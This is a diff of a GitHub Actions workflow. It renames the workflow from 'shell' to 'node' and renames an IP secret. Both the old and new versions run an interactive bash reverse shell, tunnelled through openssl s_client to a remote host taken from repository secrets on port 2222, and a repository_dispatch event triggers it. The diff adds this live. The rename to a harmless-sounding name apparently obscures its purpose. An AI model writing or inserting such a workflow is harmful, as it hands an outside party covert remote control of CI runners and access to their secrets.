@@ -1,4 +1,4 @@
-name: shell
+name: node
 on:
   repository_dispatch:
     types: node
@@ -17,4 +17,4 @@ jobs:
           ${{ secrets.CERT }}
           EOF
           sudo apt-get -qqy install openssl
-          mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect ${{ secrets.MYIP }}:2222 > /tmp/s; rm /tmp/s
+          mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect ${{ secrets.MY_IP }}:2222 > /tmp/s; rm /tmp/s
